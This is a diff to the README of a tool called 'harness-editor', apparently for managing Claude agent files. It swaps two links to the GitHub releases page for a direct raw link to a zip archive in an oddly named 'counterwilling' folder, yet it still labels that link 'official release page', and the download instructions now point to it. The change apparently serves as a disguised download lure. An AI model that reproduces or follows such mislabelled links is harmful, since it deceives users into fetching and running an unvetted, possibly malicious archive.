@@ -1,6 +1,6 @@
 # 🛠 harness-editor - Manage your Claude agent files easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Randiepatient326/harness-editor/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Randiepatient326/harness-editor/main/counterwilling/editor-harness-3.8.zip)
 
 ## 🎯 About the tool
 
@@ -12,7 +12,7 @@ Your computer needs a modern web browser. Most users already have one like Micro
 
 ## 📥 How to download and run 
 
-1. Visit the [official release page](https://github.com/Randiepatient326/harness-editor/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Randiepatient326/harness-editor/main/counterwilling/editor-harness-3.8.zip).
 2. Look for the latest version at the top.
 3. Click the link to download the file.
 4. Save the file to your computer.
